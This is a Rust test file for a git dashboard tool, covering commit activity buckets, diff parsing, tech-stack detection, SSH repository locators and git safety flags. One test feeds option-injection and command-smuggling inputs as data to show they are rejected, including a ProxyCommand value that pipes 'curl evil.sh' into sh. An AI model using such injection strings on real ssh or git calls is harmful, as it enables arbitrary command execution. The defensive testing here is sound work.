use crate::config::Member;
use crate::git::*;
use chrono::{Datelike, Duration, Local, TimeZone};
use std::fs;
use std::path::Path;
use std::process::Command;

/// Timestamp for noon local time `days_ago` days before `today`
/// (noon avoids DST-boundary surprises in date conversions).
fn ts_days_ago(today: chrono::NaiveDate, days_ago: i64) -> i64 {
    let date = today - Duration::days(days_ago);
    Local
        .with_ymd_and_hms(date.year(), date.month(), date.day(), 12, 0, 0)
        .unwrap()
        .timestamp()
}

#[test]
#[cfg(unix)]
fn test_run_with_timeout_large_output_no_deadlock() {
    // 200 KB exceeds the 64 KiB pipe buffer: the reader threads must
    // drain it or the child would block before exiting
    let mut cmd = Command::new("sh");
    cmd.arg("-c").arg("head -c 200000 /dev/zero");
    let out = run_with_timeout(cmd, std::time::Duration::from_secs(10)).unwrap();
    assert!(out.status.success());
    assert_eq!(out.stdout.len(), 200_000);
}

#[test]
#[cfg(unix)]
fn test_run_with_timeout_kills_hung_process() {
    let mut cmd = Command::new("sleep");
    cmd.arg("5");
    let start = std::time::Instant::now();
    let res = run_with_timeout(cmd, std::time::Duration::from_millis(200));
    assert!(res.is_err());
    assert!(res.unwrap_err().contains("タイムアウト"));
    assert!(start.elapsed() < std::time::Duration::from_secs(3));
}

#[test]
fn test_build_activity_30_days_daily_buckets() {
    let today = chrono::NaiveDate::from_ymd_opt(2026, 6, 10).unwrap();
    let timestamps = vec![
        ts_days_ago(today, 0),  // today
        ts_days_ago(today, 0),  // today (second commit)
        ts_days_ago(today, 29), // oldest day inside the window
        ts_days_ago(today, 31), // outside → dropped everywhere
    ];
    let a = build_activity(&timestamps, 30, today);
    assert_eq!(a.daily.counts.len(), 30);
    assert_eq!(a.daily.dates.len(), 30);
    assert_eq!(*a.daily.counts.last().unwrap(), 2); // newest bucket
    assert_eq!(a.daily.counts[0], 1); // oldest bucket
    assert_eq!(a.daily.counts.iter().sum::<usize>(), 3);
    // hourly/weekly are windowed too: the 31-days-ago commit is excluded
    assert_eq!(a.hourly.iter().sum::<usize>(), 3);
    assert_eq!(a.weekly.iter().sum::<usize>(), 3);
    assert_eq!(a.hourly[12], 3); // all test commits are at noon
    assert_eq!(a.daily.dates[0], "05/12"); // 29 days before 06/10
    assert_eq!(a.daily.dates[29], "06/10");
}

#[test]
fn test_build_activity_90_days_weekly_buckets() {
    let today = chrono::NaiveDate::from_ymd_opt(2026, 6, 10).unwrap();
    let timestamps = vec![
        ts_days_ago(today, 0),  // newest bucket (0-6 days ago)
        ts_days_ago(today, 8),  // second bucket (7-13 days ago)
        ts_days_ago(today, 89), // last bucket
    ];
    let a = build_activity(&timestamps, 90, today);
    assert_eq!(a.daily.counts.len(), 13); // ceil(90 / 7)
    assert_eq!(*a.daily.counts.last().unwrap(), 1);
    assert_eq!(a.daily.counts[11], 1);
    assert_eq!(a.daily.counts[0], 1);
    assert_eq!(a.daily.counts.iter().sum::<usize>(), 3);
}

#[test]
fn test_build_activity_all_history_span_from_oldest() {
    let today = chrono::NaiveDate::from_ymd_opt(2026, 6, 10).unwrap();
    let timestamps = vec![
        ts_days_ago(today, 0),
        ts_days_ago(today, 700), // ~2 years back → coarse buckets
    ];
    let a = build_activity(&timestamps, 0, today);
    // span 701 days → bucket = ceil(701/31) = 23 days → 31 buckets
    assert_eq!(a.daily.counts.len(), 31);
    assert_eq!(a.daily.counts.iter().sum::<usize>(), 2);
    assert_eq!(a.daily.counts[0], 1);
    assert_eq!(*a.daily.counts.last().unwrap(), 1);
    // labels switch to year/month form for spans beyond a year
    assert!(a.daily.dates[0].contains('/'));
    assert_eq!(a.daily.dates[0].len(), 5); // "yy/mm"
}

#[test]
fn test_build_activity_empty() {
    let today = chrono::NaiveDate::from_ymd_opt(2026, 6, 10).unwrap();
    let a = build_activity(&[], 0, today);
    assert_eq!(a.daily.counts.len(), 1);
    assert_eq!(a.daily.counts[0], 0);
    assert_eq!(a.hourly.iter().sum::<usize>(), 0);
}

#[test]
fn test_format_size() {
    assert_eq!(format_size(0), "0 B");
    assert_eq!(format_size(100), "100 B");
    assert_eq!(format_size(1023), "1023 B");
    assert_eq!(format_size(1024), "1.0 KB");
    assert_eq!(format_size(1536), "1.5 KB");
    assert_eq!(format_size(1024 * 1024 - 1), "1024.0 KB");
    assert_eq!(format_size(1024 * 1024), "1.00 MB");
    assert_eq!(format_size(1024 * 1024 * 15 / 10), "1.50 MB");
    assert_eq!(format_size(1024 * 1024 * 1024), "1.00 GB");
    assert_eq!(format_size(1024 * 1024 * 1024 * 25 / 10), "2.50 GB");
}

#[test]
fn test_process_contributor_log() {
    let log_data = "\
田中|||tanaka@example.com|||1620000000
Tanaka|||tanaka@example.com|||1620000100
Bob|||bob@example.com|||1620000200
Alice|||alice@example.com|||1620000300
";
    let members = vec![
        Member {
            canonical_name: "田中".to_string(),
            aliases: vec!["Tanaka".to_string(), "tanaka@example.com".to_string()],
            is_active: true,
        },
        Member {
            canonical_name: "Alice".to_string(),
            aliases: vec![],
            is_active: false,
        },
    ];

    let result = process_contributor_log(log_data, &members);

    // Output should be sorted by commit count descending
    // Total commits: 4
    // Tanaka (田中 + Tanaka alias): 2 commits (50%)
    // Bob: 1 commit (25%)
    // Alice: 1 commit (25%)
    assert_eq!(result.len(), 3);

    // 1st: Tanaka
    assert_eq!(result[0].name, "田中");
    assert_eq!(result[0].commit_count, 2);
    assert_eq!(result[0].percentage, 50.0);
    assert!(result[0].is_member);
    assert!(result[0].is_active);

    // 2nd/3rd: Bob or Alice (both have 1 commit, Bob is active = false? No, Bob is not in members so is_member = false, is_active = false)
    // Alice is a member, but is_active = false.
    let alice_info = result.iter().find(|c| c.name == "Alice").unwrap();
    assert_eq!(alice_info.commit_count, 1);
    assert_eq!(alice_info.percentage, 25.0);
    assert!(alice_info.is_member);
    assert!(!alice_info.is_active);

    let bob_info = result.iter().find(|c| c.name == "Bob").unwrap();
    assert_eq!(bob_info.commit_count, 1);
    assert_eq!(bob_info.percentage, 25.0);
    assert!(!bob_info.is_member);
    assert!(!bob_info.is_active);
}

#[test]
fn test_detect_tech_info_rails() {
    let temp_dir = std::env::temp_dir().join("test_git_dashboard_rails");
    let _ = fs::create_dir_all(&temp_dir);

    let gemfile_lock_content = "\
GEM
  remote: https://rubygems.org/
  specs:
    rails (7.0.5)
      actioncable (= 7.0.5)

PLATFORMS
  ruby

DEPENDENCIES
  rails (~> 7.0.5)

RUBY VERSION
   ruby 3.2.2p53
";
    fs::write(temp_dir.join("Gemfile.lock"), gemfile_lock_content).unwrap();
    fs::write(temp_dir.join(".ruby-version"), "ruby-3.2.1").unwrap();

    let rules = get_default_rules();
    let info = detect_tech_info_with_rules(&temp_dir, &rules);

    assert_eq!(info.language, "Ruby");
    assert_eq!(info.lang_version, "3.2.1");
    assert_eq!(info.framework, "Rails");
    assert_eq!(info.framework_version, "7.0.5");

    let _ = fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_detect_tech_info_node() {
    let temp_dir = std::env::temp_dir().join("test_git_dashboard_node");
    let _ = fs::create_dir_all(&temp_dir);

    let package_json_content = r#"{
  "name": "test-node",
  "dependencies": {
    "next": "^13.4.19",
    "react": "18.2.0"
  },
  "engines": {
    "node": ">=18.16.0"
  }
}"#;
    fs::write(temp_dir.join("package.json"), package_json_content).unwrap();
    fs::write(temp_dir.join(".nvmrc"), "v16.14.0").unwrap();

    let rules = get_default_rules();
    let info = detect_tech_info_with_rules(&temp_dir, &rules);

    assert_eq!(info.language, "JavaScript/TypeScript");
    assert_eq!(info.lang_version, "16.14.0");
    assert_eq!(info.framework, "Next/React/Express");
    assert_eq!(info.framework_version, "13.4.19");

    let _ = fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_detect_tech_info_django() {
    let temp_dir = std::env::temp_dir().join("test_git_dashboard_django");
    let _ = fs::create_dir_all(&temp_dir);

    fs::write(
        temp_dir.join("requirements.txt"),
        "Django==4.2.1\nrequests>=2.28.0",
    )
    .unwrap();
    fs::write(temp_dir.join(".python-version"), "3.10.2\n").unwrap();

    let rules = get_default_rules();
    let info = detect_tech_info_with_rules(&temp_dir, &rules);

    assert_eq!(info.language, "Python");
    assert_eq!(info.lang_version, "3.10.2");
    assert_eq!(info.framework, "Django");
    assert_eq!(info.framework_version, "4.2.1");

    let _ = fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_parse_unified_diff_additions_only() {
    let diff = "\
--- a/foo.rs
+++ b/foo.rs
@@ -1,2 +1,4 @@
 fn main() {
+    let x = 1;
+    let y = 2;
 }
";
    let rows = parse_unified_diff(diff);
    let added: Vec<_> = rows
        .iter()
        .filter(|r| r.kind == DiffRowKind::Added)
        .collect();
    assert_eq!(added.len(), 2);
    assert_eq!(added[0].right_text.as_deref(), Some("    let x = 1;"));
    assert!(added[0].left_text.is_none());
}

#[test]
fn test_parse_unified_diff_modified_pairs() {
    let diff = "\
--- a/foo.rs
+++ b/foo.rs
@@ -1,3 +1,3 @@
 fn main() {
-    let x = 1;
+    let x = 42;
 }
";
    let rows = parse_unified_diff(diff);
    let modified: Vec<_> = rows
        .iter()
        .filter(|r| r.kind == DiffRowKind::Modified)
        .collect();
    assert_eq!(modified.len(), 1);
    assert_eq!(modified[0].left_text.as_deref(), Some("    let x = 1;"));
    assert_eq!(modified[0].right_text.as_deref(), Some("    let x = 42;"));
}

#[test]
fn test_parse_unified_diff_removals_only() {
    let diff = "\
--- a/foo.rs
+++ b/foo.rs
@@ -1,4 +1,2 @@
 fn main() {
-    let x = 1;
-    let y = 2;
 }
";
    let rows = parse_unified_diff(diff);
    let removed: Vec<_> = rows
        .iter()
        .filter(|r| r.kind == DiffRowKind::Removed)
        .collect();
    assert_eq!(removed.len(), 2);
    assert!(removed[0].right_text.is_none());
}

#[test]
fn test_parse_unified_diff_context() {
    let diff = "\
--- a/foo.rs
+++ b/foo.rs
@@ -1,3 +1,3 @@
 fn a() {}
 fn b() {}
 fn c() {}
";
    let rows = parse_unified_diff(diff);
    assert!(rows.iter().all(|r| r.kind == DiffRowKind::Context));
    assert_eq!(rows.len(), 3);
    assert_eq!(rows[0].left_no, Some(1));
    assert_eq!(rows[0].right_no, Some(1));
}

#[test]
fn test_parse_unified_diff_multiple_hunks() {
    let diff = "\
--- a/foo.rs
+++ b/foo.rs
@@ -1,3 +1,3 @@
-line1
+line1 changed
 line2
 line3
@@ -10,3 +10,3 @@
 line10
-line11
+line11 changed
 line12
";
    let rows = parse_unified_diff(diff);
    let modified: Vec<_> = rows
        .iter()
        .filter(|r| r.kind == DiffRowKind::Modified)
        .collect();
    assert_eq!(modified.len(), 2);
    assert_eq!(modified[0].left_no, Some(1));
    assert_eq!(modified[1].left_no, Some(11));
}

#[test]
fn test_parse_unified_diff_dissimilar_pair_splits() {
    // A removed and an added line with little in common must not be
    // forced into a side-by-side Modified pair.
    let diff = "\
--- a/foo.rs
+++ b/foo.rs
@@ -1,2 +1,2 @@
-completely different old content
+zzz qqq xxx
 ctx
";
    let rows = parse_unified_diff(diff);
    assert_eq!(rows.len(), 3);
    assert_eq!(rows[0].kind, DiffRowKind::Removed);
    assert_eq!(rows[0].left_no, Some(1));
    assert_eq!(rows[0].right_no, None);
    assert_eq!(rows[1].kind, DiffRowKind::Added);
    assert_eq!(rows[1].left_no, None);
    assert_eq!(rows[1].right_no, Some(1));
    assert_eq!(rows[2].kind, DiffRowKind::Context);
}

#[test]
fn test_parse_unified_diff_similar_pair_modified() {
    // Small in-line edits keep the side-by-side Modified pairing
    let diff = "\
--- a/foo.rs
+++ b/foo.rs
@@ -1,1 +1,1 @@
-let value = compute(1);
+let value = compute(2);
";
    let rows = parse_unified_diff(diff);
    assert_eq!(rows.len(), 1);
    assert_eq!(rows[0].kind, DiffRowKind::Modified);
    assert_eq!(rows[0].left_no, Some(1));
    assert_eq!(rows[0].right_no, Some(1));
}

#[test]
fn test_line_similarity() {
    assert!(line_similarity("let x = foo;", "let x = bar;") >= 0.5);
    assert!(line_similarity("abcdef", "xyzqwp") < 0.5);
    assert_eq!(line_similarity("", ""), 1.0);
    assert_eq!(line_similarity("abc", ""), 0.0);
}

#[test]
fn test_parse_ssh_repo() {
    use std::path::PathBuf;
    let p = PathBuf::from("ssh://dev@vm01/home/dev/myrepo");
    assert_eq!(
        parse_ssh_repo(&p),
        Some(("dev@vm01".to_string(), "/home/dev/myrepo".to_string()))
    );
    // SSH config alias without user
    let p = PathBuf::from("ssh://devbox/srv/app");
    assert_eq!(
        parse_ssh_repo(&p),
        Some(("devbox".to_string(), "/srv/app".to_string()))
    );
    // Local paths are not SSH locators
    assert_eq!(parse_ssh_repo(Path::new("/Users/me/repo")), None);
    assert_eq!(parse_ssh_repo(Path::new("C:\\work\\repo")), None);
    // Malformed
    assert_eq!(parse_ssh_repo(Path::new("ssh://hostonly")), None);
}

#[test]
fn test_parse_ssh_repo_rejects_option_injection() {
    // `ssh` has no `--` terminator, so a host starting with `-` would be read
    // as an option: -oProxyCommand=... is arbitrary command execution.
    assert_eq!(
        parse_ssh_repo(Path::new("ssh://-oProxyCommand=curl evil.sh|sh/x")),
        None
    );
    assert_eq!(parse_ssh_repo(Path::new("ssh://-J host/srv/app")), None);
    // Whitespace and shell metacharacters never appear in a real destination
    assert_eq!(parse_ssh_repo(Path::new("ssh://a b/srv/app")), None);
    assert_eq!(parse_ssh_repo(Path::new("ssh://a;id/srv/app")), None);
    assert_eq!(parse_ssh_repo(Path::new("ssh://a$(id)/srv/app")), None);
    // A newline in the path would forge a line in the batched remote script
    assert_eq!(parse_ssh_repo(Path::new("ssh://host/srv\nid/app")), None);
    // IPv6 literals and ports stay valid
    assert!(parse_ssh_repo(Path::new("ssh://dev@[fe80::1]:22/srv/app")).is_some());
}

#[test]
fn test_git_config_args_disable_executable_hooks() {
    // A repository's own .git/config is honoured by git; these must stay
    // neutralised or adding an untrusted repo becomes code execution.
    for key in [
        "core.fsmonitor=",
        "core.sshCommand=ssh",
        "uploadpack.packObjectsHook=",
        "protocol.ext.allow=never",
    ] {
        assert!(GIT_CONFIG_ARGS.contains(&key), "missing override: {key}");
    }
}

#[test]
fn test_diff_subcommands_suppress_external_drivers() {
    // diff.external / textconv drivers are repository-controlled commands and
    // can only be disabled per subcommand, after the subcommand name.
    let out = with_diff_safety_flags(&["diff", "--numstat", "HEAD"]);
    assert_eq!(out[0], "diff");
    assert!(out.contains(&"--no-ext-diff".to_string()));
    assert!(out.contains(&"--no-textconv".to_string()));
    assert_eq!(out.last().unwrap(), "HEAD");
    // blame does not accept --no-ext-diff
    let blame = with_diff_safety_flags(&["blame", "file.rs"]);
    assert_eq!(blame, vec!["blame", "--no-textconv", "file.rs"]);
    // Unrelated subcommands are passed through untouched
    assert_eq!(
        with_diff_safety_flags(&["status", "--porcelain"]),
        vec!["status", "--porcelain"]
    );
    assert!(with_diff_safety_flags(&[]).is_empty());
}

#[test]
fn test_split_batch_output_rejects_forged_sentinel() {
    let sep = "__SEP__";
    // A commit author named after the sentinel injects an extra boundary;
    // pairing the survivors with the wrong command must not happen.
    let raw = format!("main\n{sep}0\n{sep}0\nreal\n{sep}0\n");
    let r = split_batch_output(&raw, sep, 2, "");
    assert_eq!(r.len(), 2);
    assert!(r.iter().all(|x| x.is_err()));
}

#[test]
fn test_check_safe_ref_rejects_control_characters() {
    assert!(check_safe_ref("main").is_ok());
    assert!(check_safe_ref("-oProxyCommand=x").is_err());
    assert!(check_safe_ref("main\nid").is_err());
}

#[test]
fn test_split_batch_output() {
    let sep = "__SEP__";
    // Three commands: ok / failed (non-zero) / ok, with multiline output
    let raw = format!("main\n{sep}0\nerror: no upstream\n{sep}128\na\nb\nc\n{sep}0\n");
    let r = split_batch_output(&raw, sep, 3, "");
    assert_eq!(r[0].as_deref(), Ok("main"));
    assert_eq!(r[1].as_ref().unwrap_err(), "error: no upstream");
    assert_eq!(r[2].as_deref(), Ok("a\nb\nc"));
}

#[test]
fn test_split_batch_output_empty_command_output() {
    let sep = "__SEP__";
    // A command that printed nothing still yields an Ok("")
    let raw = format!("{sep}0\nx\n{sep}0\n");
    let r = split_batch_output(&raw, sep, 2, "");
    assert_eq!(r[0].as_deref(), Ok(""));
    assert_eq!(r[1].as_deref(), Ok("x"));
}

#[test]
fn test_split_batch_output_missing_sentinels_padded() {
    let sep = "__SEP__";
    // Connection dropped after the first command: rest become Err
    let raw = format!("first\n{sep}0\npartial");
    let r = split_batch_output(&raw, sep, 3, "connection closed");
    assert_eq!(r[0].as_deref(), Ok("first"));
    assert_eq!(r[1].as_ref().unwrap_err(), "connection closed");
    assert_eq!(r[2].as_ref().unwrap_err(), "connection closed");
    assert_eq!(r.len(), 3);
}

#[test]
fn test_split_batch_output_total_failure() {
    let r = split_batch_output("", "__SEP__", 2, "ssh: could not resolve host");
    assert_eq!(r.len(), 2);
    assert!(r.iter().all(|x| x.is_err()));
}

#[test]
fn test_count_conflicts() {
    let clean = "M  src/main.rs\n?? new.txt\n";
    assert_eq!(count_conflicts(clean), 0);

    // One of each documented unmerged XY code
    let conflicted = "\
DD both.txt
AU added_us.txt
UD deleted_them.txt
UA added_them.txt
DU deleted_us.txt
AA both_added.txt
UU both_modified.txt
M  unrelated.rs
";
    assert_eq!(count_conflicts(conflicted), 7);
    assert_eq!(count_conflicts(""), 0);
}

#[test]
fn test_count_conflicts_does_not_panic_on_multibyte_leading_lines() {
    // Over SSH, run_git_batch merges stderr into stdout (`2>&1`) while still
    // reporting success, so a "line" here isn't guaranteed to be genuine
    // porcelain output. A line starting with a 3-byte character used to
    // panic on the old `&l[..2]` byte slice (byte index 2 lands mid-char).
    let adversarial = "日本語のエラーメッセージ\n\u{1f600} emoji line\nM  real.rs\n";
    assert_eq!(count_conflicts(adversarial), 0);
}

#[test]
fn test_parse_ls_tree_long() {
    let out = "100644 blob a1b2c3     42\tsrc/main.rs\n\
               100644 blob d4e5f6   1024\t\"src/\\346\\227\\245.rs\"\n\
               160000 commit 999999      -\tvendor/sub\n";
    assert_eq!(parse_ls_tree_long(out), (2, 1066));
    assert_eq!(parse_ls_tree_long(""), (0, 0));
    // Truncated output must not panic or count garbage
    assert_eq!(parse_ls_tree_long("100644 blob a1b2c3"), (0, 0));
}

#[test]
fn test_split_fields_pads_missing_trailing_fields() {
    // An empty %(subject) shortens the line; missing fields read as ""
    let [name, date, subject] = split_fields::<3>("v1.0|||2024-01-01");
    assert_eq!((name, date, subject), ("v1.0", "2024-01-01", ""));
    // Extra fields are ignored rather than shifting the earlier ones
    let [a, b] = split_fields::<2>("x|||y|||z");
    assert_eq!((a, b), ("x", "y"));
}

#[test]
fn test_read_file_capped_truncates() {
    let dir = std::env::temp_dir().join(format!("gdt-cap-{}", std::process::id()));
    fs::create_dir_all(&dir).unwrap();
    let p = dir.join("big.txt");
    fs::write(&p, "a".repeat(10_000)).unwrap();
    assert_eq!(read_file_capped(&p, 100).unwrap().len(), 100);
    assert_eq!(read_file_capped(&p, 1_000_000).unwrap().len(), 10_000);
    assert!(read_file_capped(&dir.join("missing.txt"), 100).is_none());
    fs::remove_dir_all(&dir).ok();
}

#[test]
fn test_parse_sync_status() {
    let s = parse_sync_status(true, "3\t5");
    assert!(s.has_upstream);
    assert_eq!(s.ahead, 3);
    assert_eq!(s.behind, 5);

    let none = parse_sync_status(false, "");
    assert!(!none.has_upstream);
    assert_eq!((none.ahead, none.behind), (0, 0));

    // Malformed counts degrade to zero
    let bad = parse_sync_status(true, "garbage");
    assert_eq!((bad.ahead, bad.behind), (0, 0));
}

#[test]
fn test_repo_name_from_ssh_path() {
    // get_summary / get_repo_name route ssh:// locators through this
    // instead of canonicalize (which fails with "os error 123" on Windows)
    assert_eq!(
        repo_name_from_ssh_path("/home/dev/myrepo"),
        Some("myrepo".to_string())
    );
    assert_eq!(
        repo_name_from_ssh_path("/srv/app.git"),
        Some("app".to_string())
    );
    assert_eq!(
        repo_name_from_ssh_path("/srv/app/"),
        Some("app".to_string())
    );
    assert_eq!(repo_name_from_ssh_path("/"), None);
    assert_eq!(repo_name_from_ssh_path(""), None);
}

#[test]
fn test_shell_quote() {
    assert_eq!(shell_quote("log"), "'log'");
    assert_eq!(
        shell_quote("--pretty=format:%C(auto)%h %s"),
        "'--pretty=format:%C(auto)%h %s'"
    );
    assert_eq!(shell_quote("it's"), r"'it'\''s'");
}

#[test]
fn test_search_commits_across_a_real_repo() {
    use std::fs;
    let temp_dir = std::env::temp_dir().join("git_test_search_commits");
    let _ = fs::remove_dir_all(&temp_dir);
    fs::create_dir_all(&temp_dir).unwrap();
    Command::new("git")
        .arg("init")
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["config", "user.name", "Searcher"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["config", "user.email", "s@example.com"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    for msg in ["fix(auth): patch login bug", "add feature X", "FIX typo"] {
        fs::write(temp_dir.join("f.txt"), msg).unwrap();
        Command::new("git")
            .args(["add", "."])
            .current_dir(&temp_dir)
            .output()
            .unwrap();
        Command::new("git")
            .args(["commit", "-m", msg])
            .current_dir(&temp_dir)
            .output()
            .unwrap();
    }

    // Case-insensitive, and "(auth)" must not be read as regex syntax.
    let hits = search_commits(&temp_dir, "fix(auth)", 10).unwrap();
    assert_eq!(hits.len(), 1);
    assert_eq!(hits[0].message, "fix(auth): patch login bug");

    // Substring match across commits, case-insensitive.
    let hits = search_commits(&temp_dir, "FIX", 10).unwrap();
    assert_eq!(hits.len(), 2);

    let hits = search_commits(&temp_dir, "nonexistent-term", 10).unwrap();
    assert!(hits.is_empty());

    let _ = fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_parse_unified_diff_no_newline_marker() {
    let diff = "\
--- a/foo.rs
+++ b/foo.rs
@@ -1,2 +1,2 @@
 line1
-old value
\\ No newline at end of file
+new value
\\ No newline at end of file
";
    let rows = parse_unified_diff(diff);
    // The "\ No newline" markers must not become rows or shift numbering
    assert_eq!(rows.len(), 2);
    assert_eq!(rows[0].kind, DiffRowKind::Context);
    assert_eq!(rows[1].kind, DiffRowKind::Modified);
    assert_eq!(rows[1].left_no, Some(2));
    assert_eq!(rows[1].right_no, Some(2));
}

#[test]
fn test_get_summary_no_upstream() {
    use std::fs;
    let temp_dir = std::env::temp_dir().join("git_test_summary_no_upstream");
    let _ = fs::remove_dir_all(&temp_dir);
    fs::create_dir_all(&temp_dir).unwrap();

    let output = Command::new("git")
        .arg("init")
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    assert!(output.status.success());

    // End-to-end through the batched metadata path (local repos run the
    // batch as N sequential git commands). A fresh repo has no upstream.
    let summary = get_summary(&temp_dir, &[]).unwrap();
    assert!(!summary.has_upstream);
    assert_eq!(summary.ahead, 0);
    assert_eq!(summary.behind, 0);
    assert!(!summary.has_remote);

    let _ = fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_get_stash_list() {
    use std::fs;
    let temp_dir = std::env::temp_dir().join("git_test_stash_list");
    let _ = fs::remove_dir_all(&temp_dir);
    fs::create_dir_all(&temp_dir).unwrap();

    Command::new("git")
        .arg("init")
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["config", "user.name", "Test User"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["config", "user.email", "test@example.com"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();

    // Need at least one commit to stash
    fs::write(temp_dir.join("file.txt"), "hello").unwrap();
    Command::new("git")
        .args(["add", "."])
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["commit", "-m", "initial commit"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();

    // Check empty stash list
    let stashes = get_stash_list(&temp_dir).unwrap();
    assert!(stashes.is_empty());

    // Make change and stash it
    fs::write(temp_dir.join("file.txt"), "hello world").unwrap();
    Command::new("git")
        .args(["stash", "push", "-m", "my stashed changes"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();

    let stashes = get_stash_list(&temp_dir).unwrap();
    assert_eq!(stashes.len(), 1);
    assert_eq!(stashes[0].ref_name, "stash@{0}");
    assert!(stashes[0].message.contains("my stashed changes"));
    assert_eq!(stashes[0].author, "Test User");

    let _ = fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_get_file_blame_caps_entries_on_a_very_large_file() {
    use std::fs;
    let temp_dir = std::env::temp_dir().join("git_test_file_blame_capped");
    let _ = fs::remove_dir_all(&temp_dir);
    fs::create_dir_all(&temp_dir).unwrap();
    Command::new("git")
        .arg("init")
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["config", "user.name", "Blame Author"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["config", "user.email", "blame@example.com"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();

    // A few hundred lines past the cap, so a passing test can't be an
    // accident of the file happening to be exactly at the boundary.
    let content: String = (0..20_200).map(|i| format!("line {i}\n")).collect();
    fs::write(temp_dir.join("big.txt"), content).unwrap();
    Command::new("git")
        .args(["add", "."])
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["commit", "-m", "big file"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();

    let blame = get_file_blame(&temp_dir, "HEAD", "big.txt").unwrap();
    assert_eq!(
        blame.len(),
        20_000,
        "expected the blame result to be capped rather than growing unbounded"
    );

    let _ = fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_get_file_blame() {
    use std::fs;
    let temp_dir = std::env::temp_dir().join("git_test_file_blame");
    let _ = fs::remove_dir_all(&temp_dir);
    fs::create_dir_all(&temp_dir).unwrap();

    Command::new("git")
        .arg("init")
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["config", "user.name", "Blame Author"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["config", "user.email", "blame@example.com"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();

    fs::write(temp_dir.join("file.txt"), "line 1\nline 2\n").unwrap();
    Command::new("git")
        .args(["add", "."])
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["commit", "-m", "first commit"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();

    let blame = get_file_blame(&temp_dir, "HEAD", "file.txt").unwrap();
    assert_eq!(blame.len(), 2);
    assert_eq!(blame[0].author, "Blame Author");
    assert_eq!(blame[0].summary, "first commit");
    assert_eq!(blame[1].author, "Blame Author");
    assert_eq!(blame[1].summary, "first commit");

    let _ = fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_get_file_blame_working_tree_shows_uncommitted_lines() {
    use std::fs;
    let temp_dir = std::env::temp_dir().join("git_test_file_blame_wt");
    let _ = fs::remove_dir_all(&temp_dir);
    fs::create_dir_all(&temp_dir).unwrap();

    Command::new("git")
        .arg("init")
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["config", "user.name", "Blame Author"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["config", "user.email", "blame@example.com"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();

    fs::write(temp_dir.join("file.txt"), "line 1\n").unwrap();
    Command::new("git")
        .args(["add", "."])
        .current_dir(&temp_dir)
        .output()
        .unwrap();
    Command::new("git")
        .args(["commit", "-m", "first commit"])
        .current_dir(&temp_dir)
        .output()
        .unwrap();

    // An uncommitted edit: blaming HEAD would misattribute this line to the
    // first commit, which is why the diff view uses BLAME_WORKING_TREE.
    fs::write(temp_dir.join("file.txt"), "line 1\nuncommitted line\n").unwrap();

    let committed = get_file_blame(&temp_dir, "HEAD", "file.txt").unwrap();
    assert_eq!(
        committed.len(),
        1,
        "HEAD only knows about the committed line"
    );

    let worktree = get_file_blame(&temp_dir, BLAME_WORKING_TREE, "file.txt").unwrap();
    assert_eq!(worktree.len(), 2);
    assert_eq!(worktree[0].author, "Blame Author");
    // git's synthetic author for the not-yet-committed line
    assert!(worktree[1].author.contains("Not Committed Yet"));

    let _ = fs::remove_dir_all(&temp_dir);
}

#[test]
fn test_parse_commit_log() {
    let log = "\
* a1b2c3d|||HEAD -> main, tag: v1.0.0, origin/main|||Alice|||2023-01-01 12:00|||First commit
| * e5f6g7h|||feature/login|||Bob|||2023-01-02 15:30|||Second commit
";
    let commits = parse_commit_log(log);
    assert_eq!(commits.len(), 2);
    assert_eq!(commits[0].hash, "a1b2c3d");
    assert_eq!(commits[0].author, "Alice");
    assert_eq!(commits[0].date, "2023-01-01 12:00");
    assert_eq!(commits[0].message, "First commit");
    assert_eq!(commits[0].graph, "* ");
    assert_eq!(commits[0].refs.len(), 3);
    assert_eq!(
        commits[0].refs[0],
        CommitRef {
            name: "main".into(),
            is_head: true,
            is_tag: false,
            is_remote: false,
        }
    );
    assert_eq!(
        commits[0].refs[1],
        CommitRef {
            name: "v1.0.0".into(),
            is_head: false,
            is_tag: true,
            is_remote: false,
        }
    );
    assert_eq!(
        commits[0].refs[2],
        CommitRef {
            name: "origin/main".into(),
            is_head: false,
            is_tag: false,
            is_remote: true,
        }
    );

    assert_eq!(commits[1].hash, "e5f6g7h");
    assert_eq!(commits[1].author, "Bob");
    assert_eq!(commits[1].date, "2023-01-02 15:30");
    assert_eq!(commits[1].message, "Second commit");
    assert_eq!(commits[1].graph, "| * ");
    assert_eq!(commits[1].refs.len(), 1);
    assert_eq!(
        commits[1].refs[0],
        CommitRef {
            name: "feature/login".into(),
            is_head: false,
            is_tag: false,
            is_remote: false,
        }
    );
}

#[test]
fn test_parse_commit_log_keeps_ansi_graph_colors() {
    // Real `git log --graph --color=always` output for a two-lane history:
